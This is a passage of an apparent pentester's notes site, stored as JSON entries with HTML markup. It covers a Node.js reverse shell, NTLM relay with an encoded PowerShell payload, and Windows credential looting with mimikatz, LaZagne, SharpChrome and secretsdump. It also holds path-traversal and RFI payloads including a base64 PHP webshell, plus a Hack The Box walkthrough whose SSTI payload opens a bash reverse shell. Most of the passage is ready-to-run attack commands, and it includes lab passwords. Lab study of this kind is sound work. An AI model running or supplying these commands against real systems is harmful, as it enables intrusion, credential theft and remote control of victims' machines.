class=\"p\"\u003e;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    var \u003cspan class=\"nv\"\u003eclient\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e new net.Socket\u003cspan class=\"o\"\u003e()\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    client.connect\u003cspan class=\"o\"\u003e(\u003c/span\u003e4242, \u003cspan class=\"s2\"\u003e\u0026#34;10.10.15.18\u0026#34;\u003c/span\u003e, \u003cspan class=\"k\"\u003efunction\u003c/span\u003e\u003cspan class=\"o\"\u003e(){\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e        client.pipe\u003cspan class=\"o\"\u003e(\u003c/span\u003esh.stdin\u003cspan class=\"o\"\u003e)\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e        sh.stdout.pipe\u003cspan class=\"o\"\u003e(\u003c/span\u003eclient\u003cspan class=\"o\"\u003e)\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e        sh.stderr.pipe\u003cspan class=\"o\"\u003e(\u003c/span\u003eclient\u003cspan class=\"o\"\u003e)\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"o\"\u003e})\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"k\"\u003ereturn\u003c/span\u003e /a/\u003cspan class=\"p\"\u003e;\u003c/span\u003e // Prevents the Node.js application form crashing\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"o\"\u003e})()\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\r\n  \u003c/figure\u003e\r\n\u003c/div\u003e","tags":[],"title":"Nodejs"},{"content":" Get a code execution , after relaying smb : #need to admin privileges sudo ntlmrelayx --no-http-server -smb2support -t 192.168.50.212 -c \u0026#34;powershell -enc JABjAGwAaQBlAG4AdA...\u0026#34;\ra appliquer en lan Responder.py -I enp4s0 -wdFb ntlmrelayx -tf target.txt -smb2support -i\rRBCD : Responder.py -I enp4s0 -wdFb ntlmrelayx.py -t ldap://10.2.10.11 -i -6 -wh wpad-lab ncat -n 127.0.0.1 11000\rDisable SMB et HTTP\nAssuming that our previously compromised computer account is named LA-SRV01-2019, we issue the following command to grant that account RBCD privileges over the relayed LA-WIN11-22H1-1$ account:\n# set_rbcd LA-WIN11-22H2-1$ LA-SRV01-2019$ getST.py -impersonate administrator -spn \u0026#39;WSMAN/LA-WIN11-22H2-1.babysteps.domain\u0026#39; -dc-ip 10.2.10.11 -hashes ","date":"2023-09-07","id":80,"permalink":"/notes/ad/ntlm-relay/","summary":"\u003cul\u003e\n\u003cli\u003eGet a code execution , after relaying smb :\u003c/li\u003e\n\u003c/ul\u003e\n\r\n\r\n\r\n\u003cdiv class=\"expressive-code\"\u003e\r\n  \u003cfigure class=\"frame is-terminal not-content\"\u003e\r\n  \u003cfigcaption class=\"header\"\u003e\r\n    \u003cspan class=\"title\"\u003e\u003c/span\u003e\r\n  \u003c/figcaption\u003e\r\n  \u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-sh\" data-lang=\"sh\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e#need to admin privileges\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003esudo ntlmrelayx --no-http-server -smb2support -t 192.168.50.212\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e-c \u003cspan class=\"s2\"\u003e\u0026#34;powershell -enc JABjAGwAaQBlAG4AdA...\u0026#34;\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\r\n  \u003c/figure\u003e\r\n\u003c/div\u003e\r\n\u003cul\u003e\n\u003cli\u003ea appliquer en lan\u003c/li\u003e\n\u003c/ul\u003e\n\r\n\r\n\r\n\u003cdiv class=\"expressive-code\"\u003e\r\n  \u003cfigure class=\"frame is-terminal not-content\"\u003e\r\n  \u003cfigcaption class=\"header\"\u003e\r\n    \u003cspan class=\"title\"\u003e\u003c/span\u003e\r\n  \u003c/figcaption\u003e\r\n  \u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-sh\" data-lang=\"sh\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eResponder.py -I enp4s0 -wdFb\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003entlmrelayx -tf target.txt -smb2support -i\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\r\n  \u003c/figure\u003e\r\n\u003c/div\u003e\r\n\u003cul\u003e\n\u003cli\u003eRBCD :\u003c/li\u003e\n\u003c/ul\u003e\n\r\n\r\n\r\n\u003cdiv class=\"expressive-code\"\u003e\r\n  \u003cfigure class=\"frame is-terminal not-content\"\u003e\r\n  \u003cfigcaption class=\"header\"\u003e\r\n    \u003cspan class=\"title\"\u003e\u003c/span\u003e\r\n  \u003c/figcaption\u003e\r\n  \u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-sh\" data-lang=\"sh\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eResponder.py -I enp4s0 -wdFb\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003entlmrelayx.py -t ldap://10.2.10.11 -i -6 -wh wpad-lab\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003encat -n 127.0.0.1 \u003cspan class=\"m\"\u003e11000\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\r\n  \u003c/figure\u003e\r\n\u003c/div\u003e\r\n\u003cp\u003e\u003ccode\u003eDisable SMB et HTTP\u003c/code\u003e\u003c/p\u003e","tags":[],"title":"Ntlm Relay"},{"content":"#Credential\nCredential Hunting Application Configuration Files\nSearching for Files findstr /SIM /C:\u0026#34;password\u0026#34; *.txt *.ini *.cfg *.config *.xml\rDictionary Files gc \u0026#39;C:\\Users\\htb-student\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Custom Dictionary.txt\u0026#39; | Select-String password\rPowerShell History File\nConfirming PowerShell History Save Path : (Get-PSReadLineOption).HistorySavePath\rReading PowerShell History File gc (Get-PSReadLineOption).HistorySavePath\rOne-liner command : foreach($user in ((ls C:\\users).fullname)){cat \u0026#34;$user\\AppData\\Roaming\\Microsoft\\Windows\\PowerShell\\PSReadline\\ConsoleHost_history.txt\u0026#34; -ErrorAction SilentlyContinue}\rPowerShell Credentials\nDecrypting PowerShell Credentials: $credential = Import-Clixml -Path \u0026#39;C:\\scripts\\pass.xml\u0026#39; $credential.GetNetworkCredential().username $credential.GetNetworkCredential().password\rOther Files Tools : https://github.com/SnaffCon/Snaffler\nSearch File Contents for String - Example 1:\ncd c:\\Users\\htb-student\\Documents \u0026amp; findstr /SI /M \u0026#34;password\u0026#34; *.xml *.ini *.txt\rSearch File Contents for String - Example 2: findstr /si password *.xml *.ini *.txt *.config findstr /si $password *.bat *.ps1 findstr /si $user *.bat *.ps1\rSearch File Contents for String - Example 3: findstr /spin \u0026#34;password\u0026#34; *.*\rSearch File Contents with PowerShell: select-string -Path C:\\Users\\htb-student\\Documents\\*.txt -Pattern password\rSearch for File Extensions - Example 1 dir /S /B *pass*.txt == *pass*.xml == *pass*.ini == *cred* == *vnc* == *.config*\rSearch for File Extensions - Example 2 where /R C:\\ *.config\rSearch for File Extensions Using PowerShell Get-ChildItem C:\\ -Recurse -Include *.rdp, *.config, *.vnc, *.cred -ErrorAction Ignore\rDownload PSSqlite: wget https://github.com/RamblingCookieMonster/PSSQLite\rViewing Sticky Notes Data : Set-ExecutionPolicy Bypass -Scope Process cd .\\PSSQLite\\ Import-Module .\\PSSQLite.psd1 $db = \u0026#39;C:\\Users\\htb-student\\AppData\\Local\\Packages\\Microsoft.MicrosoftStickyNotes_8wekyb3d8bbwe\\LocalState\\plum.sqlite\u0026#39; Invoke-SqliteQuery -Database $db -Query \u0026#34;SELECT Text FROM Note\u0026#34; | ft -wrap\rOther Interesting Files : %SYSTEMDRIVE%\\pagefile.sys %WINDIR%\\debug\\NetSetup.log %WINDIR%\\repair\\sam %WINDIR%\\repair\\system %WINDIR%\\repair\\software, %WINDIR%\\repair\\security %WINDIR%\\iis6.log %WINDIR%\\system32\\config\\AppEvent.Evt %WINDIR%\\system32\\config\\SecEvent.Evt %WINDIR%\\system32\\config\\default.sav %WINDIR%\\system32\\config\\security.sav %WINDIR%\\system32\\config\\software.sav %WINDIR%\\system32\\config\\system.sav %WINDIR%\\system32\\CCM\\logs\\*.log %USERPROFILE%\\ntuser.dat %USERPROFILE%\\LocalS~1\\Tempor~1\\Content.IE5\\index.dat %WINDIR%\\System32\\drivers\\etc\\hosts C:\\ProgramData\\Configs\\* C:\\Program Files\\Windows PowerShell\\*\rMore Credential Theft Cmdkey Saved Credentials\nListing Saved Credentials cmdkey /list\rRun Commands as Another User runas /savecred /user:inlanefreight\\bob \u0026#34;COMMAND HERE\u0026#34;\rBrowser Credentials\nDownload SharpChrome : wget https://github.com/GhostPack/SharpDPAPI https://github.com/r3motecontrol/Ghostpack-CompiledBinaries/blob/master/SharpDPAPI.exe ./sharp.exe machinetriage /showall\rRetrieving Saved Credentials from Chrome : .\\SharpChrome.exe logins /unprotect\rPassword Managers\nIf we find a .kdbx file on a server, workstation, or file share, we know we are dealing with a KeePass database which is often protected by just a master password. If we can download a .kdbx file to our attacking host, we can use a tool such as keepass2john to extract the password hash\nFind kdbx file : Get-ChildItem -Path C:\\ -Include *.kdbx -File -Recurse -ErrorAction SilentlyContinue\rExtracting KeePass Hash python keepass2john.py ILFREIGHT_Help_Desk.kdbx Email\nIf we gain access to a domain-joined system in the context of a domain user with a Microsoft Exchange inbox, we can attempt to search the user\u0026rsquo;s email for terms such as \u0026ldquo;pass,\u0026rdquo; \u0026ldquo;creds,\u0026rdquo; \u0026ldquo;credentials,\u0026rdquo; etc. using the tool MailSniper .\nTool : https://github.com/dafthack/MailSniper Tools\nDownload LaZagne: wget https://github.com/AlessandroZ/LaZagne\rRun LaZagne : .\\lazagne.exe all\rOR\nDownload SessionGopher : wget https://github.com/Arvanaghi/SessionGopher\rUse SessionGopher : Import-Module .\\SessionGopher.ps1 Invoke-SessionGopher -Target WINLPE-SRV01\rOr:\nSeatbelt https://github.com/GhostPack/Seatbelt Seatbelt.exe -group=all -full\rWindows AutoLogon\nreg query \u0026#34;HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\u0026#34;\r**Enumerating Sessions **\nreg query HKEY_CURRENT_USER\\SOFTWARE\\SimonTatham\\PuTTY\\Sessions reg query HKEY_CURRENT_USER\\SOFTWARE\\SimonTatham\\PuTTY\\Sessions\\kali%20ssh\rWifi Passwords\nViewing Saved Wireless Networks netsh wlan show profile\rRetrieving Saved Wireless Passwords netsh wlan show profile ilfreight_corp key=clear\rNetexec:\nnetexec smb 10.10.212.150 -u \u0026#34;Administrator\u0026#34; -p \u0026#34;H447.++h6g5}xi\u0026#34; --dpapi --local-auth nxc smb 10.10.202.39 --use-kcache -lsa --sam --dpapi nxc smb 192.168.250.170-172 -u \u0026#39;joker\u0026#39; -p \u0026#39;\u0026lt;3batman0893\u0026#39; -M gpp_password nxc smb 10.10.202.39 --use-kcache --local-auth -M lsassy\rImpacket :\nsecretsdump \u0026#39;ms01/administrator:H447.++h6g5}xi@10.10.234.54\u0026#39;\rMimikatz:\nUse Mimikatz: Set-MpPreference -DisableRealtimeMonitoring $true .\\mimikatz.exe \u0026#34;token::elevate\u0026#34; \u0026#34;privilege::debug\u0026#34; \u0026#34;sekurlsa::logonpasswords\u0026#34; \u0026#34;exit\u0026#34;\rLaps:\nnet user \u0026lt;current-username\u0026gt; # Global Group memberships *LAPS_Readers netexec smb 10.10.211.230 -u abbie.smith -p \u0026#34;CMe1x+nlRaaWEw\u0026#34; --laps\rLaps v2 : Get-LAPSADPassword -Identity srv Get-LapsADPassword -Identity srv -DomainController dc -AsPlainText\r","date":"2023-09-07","id":81,"permalink":"/notes/ad/password-looting/","summary":"\u003cp\u003e#Credential\u003c/p\u003e\n\u003ch4 id=\"credential-hunting\"\u003eCredential Hunting\u003c/h4\u003e\n\u003cp\u003e\u003cstrong\u003eApplication Configuration Files\u003c/strong\u003e\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003eSearching for Files\u003c/li\u003e\n\u003c/ul\u003e\n\r\n\r\n\r\n\u003cdiv class=\"expressive-code\"\u003e\r\n  \u003cfigure class=\"frame is-terminal not-content\"\u003e\r\n  \u003cfigcaption class=\"header\"\u003e\r\n    \u003cspan class=\"title\"\u003e\u003c/span\u003e\r\n  \u003c/figcaption\u003e\r\n  \u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-powershell\" data-lang=\"powershell\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"n\"\u003efindstr\u003c/span\u003e \u003cspan class=\"p\"\u003e/\u003c/span\u003e\u003cspan class=\"n\"\u003eSIM\u003c/span\u003e \u003cspan class=\"p\"\u003e/\u003c/span\u003e\u003cspan class=\"n\"\u003eC:\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026#34;password\u0026#34;\u003c/span\u003e \u003cspan class=\"p\"\u003e*.\u003c/span\u003e\u003cspan class=\"n\"\u003etxt\u003c/span\u003e \u003cspan class=\"p\"\u003e*.\u003c/span\u003e\u003cspan class=\"n\"\u003eini\u003c/span\u003e \u003cspan class=\"p\"\u003e*.\u003c/span\u003e\u003cspan class=\"n\"\u003ecfg\u003c/span\u003e \u003cspan class=\"p\"\u003e*.\u003c/span\u003e\u003cspan class=\"n\"\u003econfig\u003c/span\u003e \u003cspan class=\"p\"\u003e*.\u003c/span\u003e\u003cspan class=\"n\"\u003exml\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\r\n  \u003c/figure\u003e\r\n\u003c/div\u003e\r\n\u003cul\u003e\n\u003cli\u003eDictionary Files\u003c/li\u003e\n\u003c/ul\u003e\n\r\n\r\n\r\n\u003cdiv class=\"expressive-code\"\u003e\r\n  \u003cfigure class=\"frame is-terminal not-content\"\u003e\r\n  \u003cfigcaption class=\"header\"\u003e\r\n    \u003cspan class=\"title\"\u003e\u003c/span\u003e\r\n  \u003c/figcaption\u003e\r\n  \u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-powershell\" data-lang=\"powershell\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nb\"\u003egc \u003c/span\u003e\u003cspan class=\"s1\"\u003e\u0026#39;C:\\Users\\htb-student\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Custom Dictionary.txt\u0026#39;\u003c/span\u003e \u003cspan class=\"p\"\u003e|\u003c/span\u003e \u003cspan class=\"nb\"\u003eSelect-String\u003c/span\u003e \u003cspan class=\"n\"\u003epassword\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\r\n  \u003c/figure\u003e\r\n\u003c/div\u003e\r\n\u003cp\u003e\u003cstrong\u003ePowerShell History File\u003c/strong\u003e\u003c/p\u003e","tags":[],"title":"Password looting"},{"content":" Simple Path traversal : ../../../etc/passwd\rAnother way: http://Zephir.com/artcile=New_shoes/../../../etc/passwd\rYou can sometime do a Path traversal thanks to image path like this : https://Portswiger.web-security-academy.net/image?filename=9.jpg https://Portswiger.web-security-academy.net/image?filename=/etc/passwd\rTraversal sequences stripped : https://Portswiger.web-security-academy.net/image?filename=....//....//....//etc//passwd\r....// or ....\\/\rDouble Encoding : https://Portswiger.web-security-academy.net/image?filename=%25%32%65%25%32%65%25%32%66%25%32%65%25%32%65%25%32%66%25%32%65%25%32%65%25%32%66%25%32%65%25%32%65%25%32%66%25%36%35%25%37%34%25%36%33%25%32%66%25%37%30%25%36%31%25%37%33%25%37%33%25%37%37%25%36%34 URL double encoding\n\u0026lt; %3C %253C \u0026gt; %3E %253E « %22 %2522 ‘ %27 %2527 / %2F %252F . %2E %252E = %3D %253D – %2D %252D : %3A %253A\rYou can double encode with burpsuite\nNull Bytes : https://Portswiger.web-security-academy.net/image?filename=../../../../etc/passwd%00.png #Or https://Portswiger.web-security-academy.net/image?filename=index.php%00\rValidation of start of path : https://Portswiger.web-security-academy.net/image?filename=/var/www/images/../../../etc/passwd\rRead File with php:filter : https://Portswiger.web-security-academy.net/image?filename=php://filter/convert.base64-encode/resource=index.php\rRFI: http://example.com/index.php?page=http://atacker.com/mal.php http://example.com/index.php?page=\\\\attacker.com\\shared\\mal.php\rIf for some reason **allow_url_include** is On, but PHP is filtering access to external webpages ,you could use for example the data protocol with base64 to decode a b64 PHP code and get RCE: PHP://filter/convert.base64-decode/resource=data://plain/text,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ZWNobyAnU2hlbGwgZG9uZSAhJzsgPz4+.txt\ror\ndata://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ZWNobyAnU2hlbGwgZG9uZSAhJzsgPz4+txt\rInteresting Linux files /etc/issue /etc/passwd /etc/shadow /etc/group /etc/hosts /etc/motd /etc/mysql/my.cnf /proc/[0-9]*/fd/[0-9]* (first number is the PID, second is the filedescriptor) /proc/self/environ /proc/version /proc/cmdline /proc/sched_debug /proc/mounts /proc/net/arp /proc/net/route /proc/net/tcp /proc/net/udp /proc/self/cwd/index.php /proc/self/cwd/main.py /home/$USER/.bash_history /home/$USER/.ssh/id_rsa /run/secrets/kubernetes.io/serviceaccount/token /run/secrets/kubernetes.io/serviceaccount/namespace /run/secrets/kubernetes.io/serviceaccount/certificate /var/run/secrets/kubernetes.io/serviceaccount /var/lib/mlocate/mlocate.db /var/lib/plocate/plocate.db /var/lib/mlocate.db\r","date":"2023-09-07","id":82,"permalink":"/notes/web/path-traversal/","summary":"\u003cul\u003e\n\u003cli\u003eSimple Path traversal :\u003c/li\u003e\n\u003c/ul\u003e\n\r\n\r\n\r\n\u003cdiv class=\"expressive-code\"\u003e\r\n  \u003cfigure class=\"frame is-terminal not-content\"\u003e\r\n  \u003cfigcaption class=\"header\"\u003e\r\n    \u003cspan class=\"title\"\u003e\u003c/span\u003e\r\n  \u003c/figcaption\u003e\r\n  \u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-sh\" data-lang=\"sh\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e../../../etc/passwd\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\r\n  \u003c/figure\u003e\r\n\u003c/div\u003e\r\n\u003cul\u003e\n\u003cli\u003eAnother way:\u003c/li\u003e\n\u003c/ul\u003e\n\r\n\r\n\r\n\u003cdiv class=\"expressive-code\"\u003e\r\n  \u003cfigure class=\"frame is-terminal not-content\"\u003e\r\n  \u003cfigcaption class=\"header\"\u003e\r\n    \u003cspan class=\"title\"\u003e\u003c/span\u003e\r\n  \u003c/figcaption\u003e\r\n  \u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-sh\" data-lang=\"sh\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003ehttp://Zephir.com/artcile\u003cspan class=\"o\"\u003e=\u003c/span\u003eNew_shoes/../../../etc/passwd\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\r\n  \u003c/figure\u003e\r\n\u003c/div\u003e\r\n\u003cul\u003e\n\u003cli\u003eYou can sometime do a Path traversal thanks to image path like this :\u003c/li\u003e\n\u003c/ul\u003e\n\r\n\r\n\r\n\u003cdiv class=\"expressive-code\"\u003e\r\n  \u003cfigure class=\"frame is-terminal not-content\"\u003e\r\n  \u003cfigcaption class=\"header\"\u003e\r\n    \u003cspan class=\"title\"\u003e\u003c/span\u003e\r\n  \u003c/figcaption\u003e\r\n  \u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-sh\" data-lang=\"sh\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003ehttps://Portswiger.web-security-academy.net/image?filename\u003cspan class=\"o\"\u003e=\u003c/span\u003e9.jpg\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003ehttps://Portswiger.web-security-academy.net/image?filename\u003cspan class=\"o\"\u003e=\u003c/span\u003e/etc/passwd\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\r\n  \u003c/figure\u003e\r\n\u003c/div\u003e\r\n\u003cul\u003e\n\u003cli\u003eTraversal sequences stripped :\u003c/li\u003e\n\u003c/ul\u003e\n\r\n\r\n\r\n\u003cdiv class=\"expressive-code\"\u003e\r\n  \u003cfigure class=\"frame is-terminal not-content\"\u003e\r\n  \u003cfigcaption class=\"header\"\u003e\r\n    \u003cspan class=\"title\"\u003e\u003c/span\u003e\r\n  \u003c/figcaption\u003e\r\n  \u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-sh\" data-lang=\"sh\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003ehttps://Portswiger.web-security-academy.net/image?filename\u003cspan class=\"o\"\u003e=\u003c/span\u003e....//....//....//etc//passwd\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\r\n  \u003c/figure\u003e\r\n\u003c/div\u003e\r\n\r\n\r\n\r\n\u003cdiv class=\"expressive-code\"\u003e\r\n  \u003cfigure class=\"frame is-terminal not-content\"\u003e\r\n  \u003cfigcaption class=\"header\"\u003e\r\n    \u003cspan class=\"title\"\u003e\u003c/span\u003e\r\n  \u003c/figcaption\u003e\r\n  \u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-sh\" data-lang=\"sh\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e....// or ....\u003cspan class=\"se\"\u003e\\/\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\r\n  \u003c/figure\u003e\r\n\u003c/div\u003e\r\n\u003cul\u003e\n\u003cli\u003eDouble Encoding :\u003c/li\u003e\n\u003c/ul\u003e\n\r\n\r\n\r\n\u003cdiv class=\"expressive-code\"\u003e\r\n  \u003cfigure class=\"frame is-terminal not-content\"\u003e\r\n  \u003cfigcaption class=\"header\"\u003e\r\n    \u003cspan class=\"title\"\u003e\u003c/span\u003e\r\n  \u003c/figcaption\u003e\r\n  \u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-sh\" data-lang=\"sh\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003ehttps://Portswiger.web-security-academy.net/image?filename\u003cspan class=\"o\"\u003e=\u003c/span\u003e%25%32%65%25%32%65%25%32%66%25%32%65%25%32%65%25%32%66%25%32%65%25%32%65%25%32%66%25%32%65%25%32%65%25%32%66%25%36%35%25%37%34%25%36%33%25%32%66%25%37%30%25%36%31%25%37%33%25%37%33%25%37%37%25%36%34 \u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\r\n  \u003c/figure\u003e\r\n\u003c/div\u003e\r\n\u003cp\u003e\u003ca href=\"https://yolospacehacker.com/en/toolbox.php?id=LFIURLDoubleEncodage\"\u003eURL double encoding\u003c/a\u003e\u003c/p\u003e","tags":[],"title":"Path Traversal"},{"content":"#ssti\nEnumeration : nmap -sC -sV-p- $ip\rOutput : 22/tcp open ssh OpenSSH 8.9p1 Ubuntu 3ubuntu0.6 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 256 80:e4:79:e8:59:28:df:95:2d:ad:57:4a:46:04:ea:70 (ECDSA) |_ 256 e9:ea:0c:1d:86:13:ed:95:a9:d0:0b:c8:22:e4:cf:e9 (ED25519) 80/tcp open http nginx |_http-title: Weighted Grade Calculator Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel\rExploitation form ssti RCE / bypass regex filter : ABCDE%0A\u0026lt;%25%3d+system(\u0026#34;echo+L2Jpbi9iYXNoIC1sID4gL2Rldi90Y3AvMTAuMTAuMTQuNTMvNDI0MiAwPCYxIDI%2bJjE%3d+|+base64+-d+|+bash+\u0026#34;)+%25\u0026gt; #payload\r\u0026quot;%0A\u0026quot; to bypass the filter and at the same type encode the payload in base64 to also bypass security .\nInteresting file :\nsusan@perfection:~/Migration$ cat pupilpath_credentials.db cat pupilpath_credentials.db ^ableusersusersCREATE TABLE users ( id INTEGER PRIMARY KEY, name TEXT, password TEXT a\\ Susan Millerabeb6f8eb5722b8ca3b45f6f72a0cf17c7028d62a15a30199347d9d74f39023fsusan@perfection:~/Migration$ ^C\rCracking the hash : hashcat -m 1400 hash -a 3 \u0026#34;susan_nasus_?d?d?d?d?d?d?d?d?d\u0026#34;\rThe structure of the password was in /var/mail\n","date":"2023-09-07","id":83,"permalink":"/notes/lab/htb/perfection/","summary":"\u003cp\u003e#ssti\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003eEnumeration :\u003c/li\u003e\n\u003c/ul\u003e\n\r\n\r\n\r\n\u003cdiv class=\"expressive-code\"\u003e\r\n  \u003cfigure class=\"frame is-terminal not-content\"\u003e\r\n  \u003cfigcaption class=\"header\"\u003e\r\n    \u003cspan class=\"title\"\u003e\u003c/span\u003e\r\n  \u003c/figcaption\u003e\r\n  \u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-sh\" data-lang=\"sh\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003enmap -sC -sV-p- \u003cspan class=\"nv\"\u003e$ip\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\r\n  \u003c/figure\u003e\r\n\u003c/div\u003e\r\n\u003cul\u003e\n\u003cli\u003eOutput :\u003c/li\u003e\n\u003c/ul\u003e\n\r\n\r\n\r\n\u003cdiv class=\"expressive-code\"\u003e\r\n  \u003cfigure class=\"frame is-terminal not-content\"\u003e\r\n  \u003cfigcaption class=\"header\"\u003e\r\n    \u003cspan class=\"title\"\u003e\u003c/span\u003e\r\n  \u003c/figcaption\u003e\r\n  \u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-sh\" data-lang=\"sh\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.6 \u003cspan class=\"o\"\u003e(\u003c/span\u003eUbuntu Linux\u003cspan class=\"p\"\u003e;\u003c/span\u003e protocol 2.0\u003cspan class=\"o\"\u003e)\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"p\"\u003e|\u003c/span\u003e ssh-hostkey: \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"p\"\u003e|\u003c/span\u003e   \u003cspan class=\"m\"\u003e256\u003c/span\u003e 80:e4:79:e8:59:28:df:95:2d:ad:57:4a:46:04:ea:70 \u003cspan class=\"o\"\u003e(\u003c/span\u003eECDSA\u003cspan class=\"o\"\u003e)\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"p\"\u003e|\u003c/span\u003e_  \u003cspan class=\"m\"\u003e256\u003c/span\u003e 